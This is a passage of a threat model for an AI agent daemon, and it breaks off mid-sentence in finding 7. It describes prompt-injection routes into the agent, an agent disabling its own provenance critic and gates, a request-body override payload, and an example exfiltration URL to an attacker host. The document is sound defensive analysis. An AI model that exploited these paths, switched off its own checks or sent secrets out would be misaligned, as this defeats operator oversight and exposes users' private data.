# Threat model

This document is the record of the risks and costs the PRD's decisions
create (principle 9: "the standing record of what that costs"), kept
current whenever untrusted text can reach somewhere new or a tool can do
something new. It derives from the PRD: a finding records a cost the PRD
accepted, not a requirement the PRD imposes. A mitigation described here is
an option the operator can apply, or a statement of what the tree does now
— neither is a requirement unless the PRD states it. If a finding implies
something must be built, the change belongs in the PRD.

One exception: where the PRD incorporates a passage of this document by
reference, that passage is binding as part of the PRD requirement that
cites it, and is marked so here. Today that is the Signal download gate's
allowlist ("Signal attachment downloads", cited by PRD §3.2).

First written from a security review conducted 2026-10-22 of the tree at
commit `cca7604`, then updated for the documentation fixes that landed
alongside that review.

## The short version

Corvidae is a personal agent daemon for a single machine, and the design
says so. Within that model it does several things right: Signal is
default-deny with silent refusal, retrieved context is framed as data, tool
`_ctx` is hidden from the model, SQL is parameterized, signal-cli is pinned
and signature-verified, and the docs are candid about plaintext at rest.
The Discord and Zulip transports follow Signal's model: default-deny, silent
refusal, and outbound mentions disabled. The web transport binds loopback by
default, needs a token that can't be turned off, and renders model output
through DOMPurify under a strict CSP.

Memory spans every channel: the PRD makes the agent one identity across
channels, with no compartments and no cross-channel allowlist, and retrieval,
`search_memory`, `search_transcripts`, `recall_raw`, near-duplicate merge, the provenance critic's
evidence search and the heartbeat's review all reach the whole memory (#168).
Finding 15 records what that costs, including a gap the operator has
accepted.

The weak spot is that the model's authority is unbounded and the model's
inputs are not. Simon Willison's "lethal trifecta" is three things in one
agent: access to private data, exposure to untrusted content, and a way to
send data out. Corvidae has all three, with nothing structural separating
them:

- **Private data.** `read_file` reaches `sessions.db`, the signal-cli data
  directory (which *is* the Signal credential), and `~/.ssh`. `shell`
  reaches everything else.
- **Untrusted content.** Every IRC channel message and private message,
  every Discord message that mentions the bot from an allowlisted user in
  a channel other people can read (with `discord.require_mention: false`,
  or a `discord.channels` entry setting it false for that channel, every
  message that user posts there),
  every Zulip message that mentions the bot from an allowlisted
  user in a channel other people can read (with `zulip.require_mention:
  false`, or a `zulip.channels` entry, every message that user posts there),
  every webhook payload,
  every web page `web_fetch` returns, every DuckDuckGo snippet, every MCP
  tool description and result, and every memory distilled from any of the
  above.
- **Exfiltration.** `web_fetch` will GET any URL with no scheme or host
  restriction. `shell` has the network. The PRD's send tool adds people
  as destinations (finding 15).

The provenance critic and the CONTEXT framing are soft mitigations. They
depend on the model behaving, which is the one thing you cannot assume
under prompt injection or with a poisoned model. The provenance check is
model-driven at both ends (#155). Stage-2 appraisal, reading the exchange,
decides which claims to check, so injected text can talk it out of listing
a claim. The provenance critic is shown excerpts of earlier raw-log
messages, from every channel, matching retrieval (finding 15, #168), so
text from one channel can reach the critic's prompt while it judges another's
reply. They are quoted, untrusted text in the critic's prompt, framed as data, and
the critic's objections re-enter the window as CONTEXT (provenance objections, and retention findings when the lens has a root (finding 21), also wake a turn whose stub tells the agent it may reply `NO_REPLY` to send nothing; `SilencePlugin`'s veto of a final containing `NO_REPLY` covers every turn origin while it is loaded; otherwise only critique's own exact-match veto of critique-origin turns applies). The number of
claims (5) and excerpts (5 per claim, 500 characters each) is capped, so
one reply can't fan out into an unbounded critic prompt. Leaving sandboxing out
of the MVP was a reasonable call, but it matters here: the attacker is not
another tenant, it is whoever can post in a channel the bot sits in.

## Assets and adversaries

Assets, roughly in order of how bad it is to lose them:

1. The signal-cli data directory. There is no recovery; whoever has it is
   the bot's phone number. The Discord bot token (`discord.token` or
   `DISCORD_TOKEN`) is the same kind of asset: whoever holds it is the bot,
   and it is read from `agent.yaml` or the environment, both of which
   `read_file` and `shell` can reach. It is revocable (reset it in the
   Developer Portal), which the Signal identity is not. The web token
   (`web.token` or `CORVIDAE_WEB_TOKEN`, or the generated one in the
   daemon log) and its session cookie are a third: whoever holds either
   one drives the agent, tools and all. Changing the token revokes it. The
   Zulip bot's API key (`zulip.api_key` or `ZULIP_API_KEY`) is the same
   kind of asset as the Discord token: whoever holds it is the bot, it sits
   where `read_file` and `shell` can reach it, and it is revocable (regenerate
   it on the bot's Zulip settings page). It is never logged.
   An MCP server's bearer token, passed through `${VAR}` in
   `mcp.servers.<name>.headers`, is a fourth: it lives in the daemon's
   environment, which `shell` can read (`env`, `/proc/self/environ`), and
   grants whatever that server grants. A credential embedded in a server's
   `url` instead — a query-string token or a `user:pass@` userinfo — stays
   out of the MCP connect-failure and retry warnings and the MCP
   config-error messages: the two warnings name only the endpoint's scheme,
   host, port and path, and for such a server they carry the exception's
   text with every URL in it reduced the same way instead of its traceback
   (an HTTP client quotes the URL in its errors); a config-error skip
   describes a rejected value likewise (#386). Library loggers are filtered
   too (#595): when the MCP client starts, every root log handler carries a
   filter over records from `mcp.*`, `httpx.*`, `httpx2.*`, `httpcore.*` and `httpcore2.*` that runs the
   same URL redaction, so the SDK's `Connecting to StreamableHTTP endpoint:
   <url>` line, its error records, their tracebacks and stack traces name the endpoint without the userinfo
   or the query. That is a net over text corvidae does not emit, so it
   recognises the URL shapes `_redact_url` knows and nothing more: a
   credential a library writes in some other form — split across fields, broken by a raw newline inside the URL, or
   inside a base64 `Authorization` header it echoes — is not caught, which is
   why a `${VAR}` header is still the shape to prefer over a credential in
   the URL. The filter sits on the root handlers present when the client
   starts, so a handler added to a descendant logger, or a root reconfigured
   later, is not covered; and loggers outside those listed (`asyncio`'s "Task
   exception was never retrieved", `anyio`) can still write a URL an HTTP
   error quotes.
2. The host account corvidae runs as, and anything it can read or run.
3. `sessions.db`, the JSONL logs, and the memory tables: plaintext copies
   of every conversation, including end-to-end-encrypted Signal ones.
   Discord conversations are not end-to-end encrypted to begin with:
   Discord the company can read them whatever corvidae does, and so can the
   Zulip server's operator.
   The daemon log belongs here too: an anomalous model response (a reply
   cut off mid-reasoning, or one that reopens reasoning after its answer)
   can be logged at warning level with its text, and that text can carry
   anything the model held in context, including secrets a tool read
   (#348). Treat the daemon log as you treat `sessions.db`.
4. `agent.yaml`: operator intent, hot-reloaded within seconds of a write
   (default poll 2s).
5. The LLM server, if it is shared with anything else, and each
   provider's warm context heads (PRD principle 16): the slot time and the
   warm prefixes the operator's own turns need, and money on a metered
   endpoint, which corvidae doesn't cap.

Adversaries:

- **Anyone in an IRC channel the bot has joined**, or anyone who can PM
  it. They are refused unless on `irc.allow`, but IRC nicks are
  unauthenticated on networks without services accounts.
- **Anyone in a Discord server the bot has been invited to**, who can
  @-mention it, and anyone Discord lets DM it.
  The allowlist refuses them, silently; see finding 5. A message that does not
  mention the bot in a mention-only channel is dropped before the kernel sees
  it, and the DEBUG line recording the drop carries the sender's Discord id —
  for a stranger as well as an allowlisted user, since a name is what tells a
  misconfigured allowlist from a quiet channel. The prompt's `addressed: yes`
  comes from Discord's structured mention list, not the message text, so typing
  "@corvidae" cannot set it; the mention token is still stripped from the text.
- **Anyone in a Zulip organisation the bot belongs to**, who can @-mention it
  in a channel it is subscribed to, and anyone Zulip lets DM it. The allowlist
  refuses them silently, as for Discord. A message that does not mention the
  bot in a mention-only channel is dropped before the kernel sees it, and the
  DEBUG line recording the drop names the sender's user id. The prompt's
  `addressed: yes` comes from the server's `mentioned` flag, not the message
  text (the flag is also set by a user-group mention, so a group the bot is in
  can address it). Several strings an attacker chooses reach the prompt header
  as transport-supplied names, never as instructions: the **topic** (anyone who
  can post can title it), the **channel name**, the sender's display name and,
  for a group DM, the other members' names. All are framed as data like every
  other name (PRD §3.3.11).
- **Anyone who can reach the web listener**, if it's bound beyond
  loopback, and anyone who gets the token or cookie; also any web page
  open in the operator's browser, which can try cross-site requests. See
  finding 9.
- **Anyone who can reach the webhook listener**, to the degree each endpoint's
  auth allows (none, for `token: null`). See finding 16.
- **Anyone who controls a page the bot fetches**, or a search result it
  reads.
- **An MCP server**, via its tool descriptions and results.
- **Anyone who can read a room the bot speaks in** without being
  allowlisted: a Discord guild channel, a public Zulip channel, a public IRC channel. They can't
  drive the agent, but they read its replies, and with one identity
  across channels those replies can carry what it knows from elsewhere
  (finding 15).
- **The model itself**, if the weights are poisoned or the model is simply
  wrong in a way that happens to look like an attack. Every finding below
  applies equally to "the model was tricked" and "the model is hostile".

An operator with shell on the host is out of scope. They already have
everything.

## Findings

Most severe first. File references are to the reviewed commit.

### 1. `set_settings` could overwrite the request body (fixed, #206)

At the reviewed commit, the one hard rule `RuntimeSettingsPlugin` enforced
was that `system_prompt` is immutable. It checked the literal key
(`tools/settings.py`). But every override that was not a framework key and
did not contain a dot was forwarded into the LLM request body (`agent.py`,
step 7), and `LLMClient.chat` applies it with `payload.update(extra_body)`
*after* setting `model` and `messages` (`llm.py`). So:

```python
set_settings({"messages": [{"role": "system", "content": "..."}]})
```

replaced the entire conversation, operator prompt included, on every
subsequent turn. `set_settings({"model": "..."})` repointed a shared server.
`tools` and `tool_choice` landed the same way, as did `stream`, which only
breaks the response parser. Verified with a fake session: the outgoing
payload carried the override's model and messages. The transport metadata
keys `cwd` and `tool_backend` were writable too.

Fixed with an allowlist in code. `set_settings` accepts an undotted key
only if it is an inference parameter (`INFERENCE_KEYS` in `channel.py`:
`temperature`, `top_p`, `top_k`, `frequency_penalty`, `presence_penalty`,
`max_tokens`, `seed`) or one of the framework keys `max_turns`,
`max_context_tokens` and `reasoning_history`. Any other undotted key
refuses the whole call before anything changes, a `null` (clear)
included, and the error names the rejected keys and the accepted set.
Independently, `Agent._llm_overrides` forwards only `INFERENCE_KEYS` into
the request body, so an override that reaches `runtime_overrides` some
other way still stays out of it. `agent.immutable_settings` narrows the
allowlist further; it is no longer the only thing between the model and
`messages`. Dotted plugin tunables are still open by default; that is
finding 2. If you don't need agent self-tuning at all,
`tools.disabled: [set_settings]` closes finding 2 outright too.

The allowlist does three jobs, and the PRD keeps two of them. Keeping
`messages`, `tools`, `tool_choice` and `stream` out of the request body
stays: an override there replaces what the agent loop built on every turn.
Keeping the transport metadata keys `cwd` and `tool_backend` out of the
agent's reach stays too. Keeping the agent away from every other model
parameter (`model`, `logprobs`, or any key outside the seven in
`INFERENCE_KEYS`) does not stay: PRD §3.5.6 makes them settable where the
operator allows, and finding 13 records the cost (#292).

### 2. The model can turn off its own gates

Every `resolve_tunable` key is writable per channel unless it appears in
`agent.immutable_settings`. That includes `critique.provenance.enabled` and the
sampling rate. Two plugin prompt keys are writable but are not `resolve_tunable`
keys, and no live stage reads either: `critique.prompt.<lens>` (the critic's
system prompts, below) and `appraisal.stage2_prompt` (#1129). The configuration doc acknowledges self-tuning as a deliberate
trade and recommends a blocklist. At the reviewed commit two of its four
recommended keys (`gate.engagement.enforce`, `gate.send.enforce`) did not
exist anywhere in the code, and the prompt keys were not mentioned; the
doc now lists the real set.

The output gate (`GatePlugin`, #131) added more keys of the same kind.
`gate.send.allow_progress` and `allow_thinking` hide intermediate output, and
`gate.send.quiet_origins` withholds a source's replies (finding 22). All are
writable through `set_settings` by default. None of them can silence a reply
to a person: the decide gate never withholds a user-origin final. The
engagement gate and the decide gate's salience floor, whose keys could make
the agent ignore every message on a channel or withhold every background
reply, were removed with stage-1 appraisal (#1185).

For a poisoned-model scenario this is the finding that matters most after
the first one: the only runtime check on confabulation can be switched off
by the thing being checked.

The fork instructions added for #51 (`appraisal.stage2_fork_prompt`,
`appraisal.before_send_fork_prompt`,
`critique.lens.<lens>.fork_prompt`, `critique.provenance.fork_prompt`, `memory.consolidation_fork_prompt`,
`agent.compaction_fork_prompt`) and `agent.forks.*` are read from operator
config only, so `set_settings` can't rewrite them. That covers only calls
that actually fork. A fork miss (forks off for the stage, the exchange has
left the window, a refused or unparseable fork) skips stage-2 appraisal, the
built-in critique lenses and the provenance check with a warning (#320, PRD
§3.8.5), so the standalone prompts `appraisal.stage2_prompt` and
`critique.prompt.<lens>` are no longer reachable from any live stage.
Neither is a `resolve_tunable` key, so neither is on the tunable list above;
both are accepted, both are written if `set_settings` is asked, and neither is
read by anything (#1129). Compaction on a
fork miss, and consolidation of a range that has left the window, don't use
a standalone prompt either: they send the agent's rendered view (system
prompt, window, fork instruction) on the stage's profile with no tools (PRD
§3.8; #380, #388), so the fork instructions above are the only prompts that
steer them. The old `agent.compaction_prompt` and
`memory.consolidation_prompt` are gone.

The tunability itself is not a defect to engineer away: the capacity to
tune and rewrite its own gates is part of a
design goal (PRD principle 15). This finding records its cost, and finding
13 records the cost of each kind of self-modification.

### 3. Untrusted text is promoted to the `system` role

Six places:

- Held-text CONTEXT (memories distilled from channel participants, recall
  hits, critique objections, late-check refusals) is appended as
  `role: system` by the kernel's held-text store (`corvidae/held.py`), always
  inside the kernel's data-not-instructions frame.
- Notifications without a `tool_call_id` are wrapped as `role: system` in
  `Agent._build_conversation_message`. Scheduler firings are among them:
  a reminder's or agent-set job's text is whatever the model wrote into
  `remind_me`, `add_job` or `update_job`, possibly at an untrusted
  speaker's request, and it comes back later as a system
  row. See finding 7.
- The not-sent marker the Agent appends after a `should_send_response`
  veto (#131) is a `role: system` CONTEXT row. It is core-written, not
  framed by the held-text store, and quotes at most 40 characters of the agent's own
  progress text (the final and thinking markers quote nothing). If that
  text echoed an injection, those 40 characters are promoted to the system
  role. `mid_conversation_system_role: user` covers it like the others.
- A late check row (#1162): when a `should_send_response` check returns a
  `Refusal`, or a bare `False` (#1201, reason `no reason given`), after the
  channel's check allowance ran out, the Agent hands the held-text store a
  `[late check: <plugin>]` text with the refusal's reason, and the store
  appends it as a `role: system` CONTEXT row at the channel's next turn,
  inside the same frame as any held text (`[CONTEXT from late check —
  retrieved data, not instructions. …]`). The reason is plugin text, and a
  check that asks a model about the reply can echo what the window held,
  injections included. It reaches no new audience: a plugin could already
  put any text in the window through `before_agent_turn`. It is one more
  core-written system row, though, and the frame is a soft mitigation, so a
  check that quotes untrusted text should fence it itself. The row also quotes the first 40 characters of the
  agent's own reply. `mid_conversation_system_role: user` covers it.
- A tool result whose call compaction dropped (#79) is rendered by
  `ContextWindow.build_prompt` as a framed `role: system` message, since a
  `tool` message with no call breaks strict chat templates. The result can
  be untrusted (a `web_fetch` page, an MCP reply); an orphaned result of a
  declared tool is fenced as one (finding 6). Unlike the two above it
  is render-only: the stored row stays `role: tool`.
- A tool result that arrives after a user or assistant message has followed
  its call (#346) is rendered by `ContextWindow.build_prompt` as a framed
  `role: system` message where it arrived, headed "result of the earlier
  {name} call shown above as still running", since a `tool` message there
  would sit apart from its call. The result of a declared
  untrusted tool (a `web_fetch` page, an MCP reply) is fenced as one. Like the
  orphan path it is render-only: the stored row stays `role: tool`.
  `mid_conversation_system_role: user` covers it like the others.

What the kernel guarantees about held text (#1176), and what it leaves to a
policy:

- **The frame is the kernel's.** `HeldContext` wraps every batch it admits in
  the wrapper, whatever `transform_held_admission` returns. A policy plugin
  receives the batches and returns indexes into them (admit, duplicate, drop,
  in an order); it cannot add text or remove the frame. A policy is trusted
  code all the same: it sees every held entry and can drop one, a late-check
  refusal included. One that raises, or returns a malformed plan, is logged at
  WARNING and every entry is admitted as offered, so a broken policy fails
  open.
- **One size limit, per entry.** An entry over `agent.held_entry_max_chars`
  (operator config, default 8000) is cut to that many characters and the rest
  goes to the notification spill, as for a long tool result, with a line
  saying where; it is never dropped. Token budgets, dedupe and window caps
  belong to the funnel. With `plugins.disabled: [funnel]`, or a policy that
  does not apply them, nothing bounds how many entries or tokens a source adds
  between compactions, and `funnel.window_budgets.<source>` below no longer
  bounds the laundered text one source can put in a window.
- **A second route into the prompt.** `before_compose` lets a plugin contribute
  text for the turn being composed. It is framed, where a row a plugin appends
  in `before_agent_turn` is not, and it reaches the window no more directly
  than `before_agent_turn` already allowed.
- **Held text is not durable.** It is in memory only. A restart drops it, and
  `on_stop` logs a WARNING per channel naming the count and sources.

The "retrieved data, not instructions" wrapper is the right instinct. But
message role is a stronger signal to an instruction-tuned model than a
textual disclaimer, and a chat template may render system turns with
elevated trust. Injected text in a public channel can be laundered into a
system-role CONTEXT row. The row itself survives restarts, and the memory
it came from outlives compaction and gets re-admitted on later turns.

Memory lines carry their record id, and the funnel's admission policy dedupes them on
`memory <id>)` within memory's own CONTEXT (#624, #632). Because a summary
is distilled from participants' text, a summary that quotes another
record's key (`memory 5)`) makes record 5 look present while that line
stays in the window, so record 5 is skipped as a duplicate. A raw record
(#626) is the verbatim transcript, so one where the agent quoted a recalled
line carries the key word for word. The effect is
that one recollection is suppressed for a window; nothing is injected.
Line-anchored keys would close it and are not built. Another source's
CONTEXT can't do this, since keys match only their own source's rows.
`funnel.window_budgets.<source>` bounds how much CONTEXT one source can
hold in a window, which also bounds how much laundered text that source can
put there between compactions. The flip side: once low-value or laundered
lines fill the cap, that source recalls nothing more until compaction.

Fix shape: deliver CONTEXT as a `user` turn (or a tool result) with the
same framing, and reserve `system` for text the operator wrote.

Available as an opt-in: `agent.mid_conversation_system_role: user` sends
every system message after the operator's system prompt (all four places
above) as `user`, with the framing unchanged. It is applied at prompt
build, so the stored rows keep `role: system`. The default in the tree is
still `system`, because the evals were tuned against it; PRD §3.3.7 makes
`user` the default once the harness `memory_role` probe passes. One
behavioural caveat: CONTEXT is appended after the person's message, so
with `user` the framed block becomes the last user turn the model sees.
Check in `harness/` that the model still answers the person before you
make it the default.

Compaction is the adjacent problem. Summaries are stored as
`role: assistant` (`compaction.py`), so the model reads whatever was
injected as something it said itself, and that persists across restarts
too. Every summary is now written from the agent's rendered view, by a
fork or, on a miss, as a call on the `compaction` stage's profile (PRD §3.3.3, §3.8). It
is genuinely the agent's own words about what it read, written under its
own persona, not a neutral paraphrase stored under `role: assistant`: the
earlier standalone summarizer, which made the neutral paraphrase, is gone.
The only `user`-role summary is the one for a retained tail with no user
message (#56). A `user`-role summary with data framing, the obvious
hardening, is still an experiment worth running.

### Provenance header and fence (#548)

The kernel renders a code-built `[metadata: ...]` header before a person's
message and a header plus a nonce-fenced payload (`[payload <nonce> begins]`
... `[payload <nonce> ends]`) for notifications, cross-channel tool
results and results of tools declared to return untrusted output ([design.md](design.md#provenance-header-and-fence)).

What it guarantees: the header's wording and the fence come from kernel
code. Names, ids, annotation values and payload are sanitized at render
time, so text a plugin or tool supplied inside a fenced payload cannot
close the fence without knowing the nonce, and a plugin cannot change what
the header says. The nonce differs per stored row and is not
derivable from the text.

What it does not guarantee:

- It is a cue the model is trained to weigh, not an enforced boundary; a
  model can still follow instructions inside a fence.
- `provenance.key` sits in the base directory.
  `read_file` has no root and `shell` reads any path, so a model induced to
  read the key and send it out through a tool lets an attacker forge fences
  for later rows. Mode 0600 keeps other users out, not the agent. Keep the
  file out of any directory the agent is meant to read, and delete it to
  rotate (nonces change on the next start).
- A person's own message is unfenced: it is rendered as typed, so a person
  can type header-shaped text. It is the instruction channel; only the header
  before it is kernel-built and fixes who the kernel saw send it.

### 4. Tools are unsandboxed and the exfil path is open

`shell` runs as the daemon user with no allowlist, no fixed cwd, and no
confirmation (`tools/shell.py`). `task_pipeline` is `shell` with a
120-second timeout per step (and the default 600 s per-call bound,
`tools.call_timeout`), and it calls the shell implementation directly, so
`tools.disabled` couples the two: naming either removes both, globally
and per channel (#149). `write_file` writes anywhere
the daemon user can, creating parent directories, including over
`agent.yaml`, which `ConfigWatcherPlugin` reloads within two seconds. That
lets the model clear `immutable_settings` immediately. It can also repoint
any provider's `base_url`, add an MCP server whose `command` is anything,
disable plugins, or re-enable globally disabled tools; those keys are not
hot-reloaded (nothing under `llm:` is), so they wait for the next restart,
which makes the attack persistent and quiet rather than immediate. A channel's own
`channels.<id>.tools.disabled` *is* hot-reloaded. Removing an entry from it
widens that channel's tools at its next compaction, with no restart, so on
a channel that still has `write_file` the per-channel list is only as
strong as the protection on `agent.yaml`. The same goes for a
transport-wide entry (`channels."discord:*"`, #203): all its keys reload
live onto every matching channel, so one edit widens a whole transport.
`write_file` can also
rewrite any file named in a list-form `agent.system_prompt`, which is a
persistent persona change that never touches `agent.yaml` and takes effect
on the next restart or new channel. `web_fetch` has
no scheme or host check, follows redirects, and will happily GET
`http://attacker/?d=<secret>` or `http://169.254.169.254/`.

All of this is expected for a personal agent on your own box. The Buster
harness config (`harness/buster.yaml.in`) shows the pattern for narrowing
it: no subagent, no MCP, `shell` disabled. It is not a closed profile,
though: it leaves `write_file` on, which is the `agent.yaml` path
(`task_pipeline`, the shell by another name, now goes with `shell`). A
genuinely narrowed profile needs `tools.disabled: [shell, write_file]` at
least. The same list under `channels.<id>.tools.disabled` narrows a single
channel. The rest of the daemon keeps its tools, the channel's schemas
never show the disabled ones, dispatch refuses them even when the model
names one anyway, and a `subagent` launched from that channel inherits
the restriction. A nested background agent runs with the spawning
channel's tool set (a nested `fork` carries the window's identity prompt;
a nested `subagent` keeps its persona-neutral prompt, PRD §3.5.7), and
`tools.max_agent_depth` (default 2) is what bounds how far one may spawn
another: a chain of subagents and forks is refused at that depth, which caps
how many fresh task budgets one chain can start. Cheap wins beyond that: make the dangerous tools opt-in rather than
opt-out, deny private address ranges and non-HTTP schemes in `web_fetch`,
root the file tools in a directory, and have `agent.yaml` and the prompt
files owned by another user and read-only to the daemon (if the daemon
user owns them, `shell` can `chmod` them back).

The first three of those are PRD §3.5.3 item 3, which the tree does not yet
meet: the dangerous tools are opt-out, the file tools are unrooted, and
`web_fetch` has no scheme or address check. That gap is tracked in #444.

### 5. IRC had no sender authorization (mitigated, #77)

IRC used to accept every channel message and every private message from
anyone, and a PM from a stranger auto-created a persistent channel keyed on
their nick: a private conversation with full tool access for anyone who
could reach the server, whose history the next holder of that nick
inherited. Memory records from any such channel were retrievable on every
other (finding 15), so a stranger's PM could also plant text for later
retrieval everywhere.

Now IRC is default-deny like Signal. `irc.allow` lists the senders who may
drive the agent; with none, everyone is refused, in channels and PMs. A
refusal is one INFO line and no reply. The allowlist is checked before the
channel is resolved, so a refused sender adds nothing to the registry and
leaves no `message_log` rows or memory, and a stranger can no longer
multiply channels (which also bounds finding 7). Where the network reports
services accounts, an entry matches the account, not the nick, so using
someone's nick is not enough. Residual risks:

- **Networks without accounts.** There an entry matches the nick, and
  nicks are unauthenticated: anyone who takes an allowlisted nick is that
  user. Use a network with services and account tags for anything that
  matters.
- **Account matching trusts the server, and without `account-tag` pydle's
  state.** With `account-tag` the account comes only from that message's own
  tag, which the network sets (no tag means not logged in, no nick fallback);
  pydle's user record is never consulted. Without it, matching relies on
  pydle's tracked state (`account-notify`, `extended-join`, WHOIS), which
  only knows users it has seen, can lag a logout, and is shared across lines.
  A sender who shares no channel with the bot (a PM-only user, or a
  non-member writing to a channel without `+n`) never has that record kept
  current (no logout reaches it), so such messages are refused outright
  without `account-tag` (#264).
  The residual risk is logout lag and WHOIS races for senders who do share a
  channel. An ircd or services that mis-tags, or a message delivered
  between a logout and its notification or a nick change racing a WHOIS on a
  network without `account-tag`, defeats it. Prefer networks that send
  `account-tag`.
- **Allowed users in a shared channel** are an injection path in the same
  sense as for Discord (below): the channel's history is one conversation,
  and what an allowed user pastes in is untrusted content.
- **Upgrade.** A deployment that used IRC goes silent until `irc.allow` is
  set; startup logs a WARNING saying so.

IRC, Signal, Discord and Zulip all check the allowlist before resolving the
channel, so a refused sender leaves no registry entry (#77, #103, #274, #640).

Partial mitigation (#149): `channels.<id>.tools.disabled` takes the
dangerous tools off an IRC channel the operator configures, for example
`channels: {"irc:#lex": {tools: {disabled: [shell, write_file, read_file,
subagent]}}}`, while the operator's own channels keep them. Dispatch
enforces the list, not just the schemas. It doesn't cover PM channels:
a stranger's PM channel is keyed on a nick nobody configured, so no exact
entry reaches it. A transport-wide `irc:*` entry does (#203), since it
covers channels created at runtime, but it covers every IRC channel and an
exact entry can't re-enable a tool it disables (the lists are unioned), so
it can't spare the operator's own IRC channels. Nicks share no prefix that
would single out PMs. PMs are now gated by `irc.allow`, so only allowlisted
senders reach a PM channel; `irc:*` or the global `tools.disabled` is still
the control for narrowing what those channels can do.

Discord is built like Signal, not like IRC. The transport's
`should_process_message` is a default-deny allowlist of numeric user ids; an
empty list refuses everyone, and a refusal is one INFO log line with no
reply and no typing indicator. In a server, though, anyone who can see a
channel can @-mention the bot, and what stops them is only that allowlist.
Three more things to know:

- **Allowed users in a shared channel are an injection path.** An
  allowlisted user is trusted to drive the agent, but a server channel (or
  thread) has other readers, and the channel's history is one shared
  conversation. What an allowed user pastes in, including text they copied
  from someone else, is untrusted content with the same weight as any
  other. The bot answers only when mentioned, but it records only those
  messages, so the model never sees unmentioned chatter. (With
  `discord.require_mention: false`, or a `discord.channels` entry for that
  channel, it sees every message from allowlisted users there, and still none
  from anyone else.) Prefer DMs, or
  channels where everyone present is someone you would add to `allow`.
- **Outbound mentions are disabled.** Model output can contain anything an
  attacker got into context. Every send passes `AllowedMentions.none()`,
  so `@everyone`, role mentions, and user mentions in a reply render as
  text and ping nobody. Without it a prompt-injected reply could ping a
  whole server. This closes the ping, not the content: the reply is still
  visible to everyone in the channel, including text the model was tricked
  into leaking.
- **No privileged intent.** The bot does not request the Message Content
  intent, so it cannot read server messages that do not mention it, even if
  it is in the channel. That narrows what the
  transport can ever be made to see, though it is a Discord-side limit
  and not a corvidae one. `discord.require_mention: false` requests the
  intent and removes it.

Zulip is built like Discord. The transport's `should_process_message` is a
default-deny allowlist of numeric user ids (never emails or names, which
change); an empty list refuses everyone, and a refusal is one INFO line with no
reply and no typing notice. A public channel's readers can all @-mention the
bot, and what stops them is only that allowlist. Four more things to know:

- **Allowed users in a shared channel are an injection path**, for the reason
  given for Discord: the channel's history is one conversation, and what an
  allowed user pastes in is untrusted content. In Zulip that history spans
  every topic of the channel, because a topic is a name people can rename and
  so is not part of the channel's id (PRD principle 10): text from one topic
  is in the window while the agent answers another. The agent answers only when
  mentioned (directly, or through a user group it belongs to) and records only
  those messages; with `zulip.require_mention: false`, globally or in a
  `zulip.channels` entry, it records all of an allowed user's messages there.
- **Outbound mentions are defused.** Zulip has no allowed-mentions switch. A
  reply containing `@**all**` would page the whole channel, so every send puts
  a zero-width space between `@` and `*`, which stops Zulip parsing a mention.
  This closes the ping, not the content: the reply is still visible to
  everyone who can read the channel, including anything the model was tricked
  into leaking. Silent mentions (`@_**Name**`) pass through because they
  notify no one.
- **The reply topic comes only from allowed senders.** Where the agent answers
  is the topic of the newest allowed message, so a stranger who posts under
  another topic cannot move the reply or relabel the channel to the model.
- **Plain `http://`** to a non-loopback `zulip.site` sends the API key and every
  message in the clear; startup logs a WARNING naming the site.

### 6. MCP servers are trusted peers

An MCP server's tool descriptions go into the prompt as tool schemas and
its results come back as tool results. The descriptions are not framed, and
schema sanitization is shallow by design. An MCP server is therefore a
supply-chain vector for tool-description injection. Results are framed: the
kernel declares every MCP tool as returning untrusted output (#557), so each
result reaches the model in the nonce fence under a header the code builds,
naming the tool and call id and labelling the content untrusted. That marks
data as data; it does not make the model ignore it. `transform_tool_result`
remains a pass-through hook.

**What is fenced and what is not.** Fenced as untrusted outside content: the
results of `read_file` (spill files read back included), `web_fetch`,
`web_search`, `shell` and `task_pipeline`, every MCP tool, and the memory
tools `search_transcripts` and `recall_raw` (both forms; #648). A tool declares this for itself
(`returns_untrusted`, read when the call is dispatched and stored on the
result), so a result of a tool no plugin declares is unfenced unless it acts on
another channel. Result rows stored before #557 carry no flag and stay
unfenced on reload. Unfenced today:
`search_memory` results, which are the agent's own record summaries but can
paraphrase text that was untrusted when it first arrived; the results inside a
subagent's own loop, which reach the subagent's model with no frame; and the
subagent's final report to the main model, which can repeat what the
subagent read. The header names the spill source for a read-back when the log
still holds the row that cut it (#576), cleaned like any header value, and
fenced rows are costed by the estimator at their rendered size — header and
fence included — so a long run of them cannot undercount the window against
the hard ceiling the way counting the provenance record did (#577).

The HTTP transports (`streamable_http`, `sse`) open an outbound connection
to whatever `url` names and send the configured `headers`, bearer token
included, on every request. The SDK follows a redirect only within the
endpoint's origin, so the token isn't handed to another host that way, but
a plain `http://` URL sends it in the clear: use `https://` for anything
off the local machine. Keeping the token in the environment keeps it out of
`agent.yaml`, which matters if that file is shared or checked in. It does
not keep it from the model: `shell` can read the daemon's environment, and
`write_file` can add an MCP server pointed at an attacker's URL with the
same `${VAR}` header (that takes effect at the next restart, like any
other `mcp` change).

### 7. The scheduler re-enters text later

`SchedulerPlugin` (#59) adds a delay to finding 3. On IRC anyone can ask
the bot to "remind me in 6 hours to …"; the model calls `remind_me`, and
six hours later that text re-enters the same channel as a notification
with the kernel header, stored as `role: system`. By then the exchange that set it
may have been compacted away, so the model sees an instruction-shaped
string with little memory of who wanted it. What bounds it:

- **Framing.** The firing text says a reminder "you set" is due and quotes
  the stored text as `Reminder text: «…»`, ending "Decide whether and how
  to act on it." A recurring job the agent set says the same of a "recurring
  job you set" and quotes `Job prompt: «…»`; only a `scheduler.jobs` or
  `scheduler.jobs_file` entry is framed as the operator's (#814). Any `«` or `»` inside the text is replaced, so it cannot
  close the quote and continue as framing. Rendering follows
  `agent.mid_conversation_system_role`, so `user` keeps it out of the
  system role as for every other notification. The framing is a soft
  mitigation in the same sense as the held-text frame.
- **Scoping.** All five tools (`remind_me`, `list_reminders`,
  `cancel_reminder`, `add_job`, `update_job`) act on `_ctx.channel` and take
  no channel argument. A reminder or agent-set job fires on the channel it
  was set on and nowhere else, so a stranger on IRC cannot use one to make
  the bot message a Signal contact. PRD §3.9.7 keeps it that way (owner,
  2026-11-17, #814): reaching another channel goes through §3.5.9 (finding
  15), not the scheduler. `cancel_reminder` and `update_job` refuse operator
  jobs and treat another channel's row as not found; `list_reminders` shows
  only the calling channel's rows.
- **Origin.** No tool takes an origin. Every row a tool creates carries
  origin `reminder`, so its turns are judged like any reminder's; only an
  operator job (`scheduler.jobs` or `scheduler.jobs_file`) can be `heartbeat` (#814).
- **Volume.** `scheduler.max_reminders_per_channel` (default 50) caps
  pending reminders and agent-set jobs together per channel, and text is
  capped at 2000 characters for both.
  The cap is per channel. Finding 5 used to let a stranger open new IRC PM
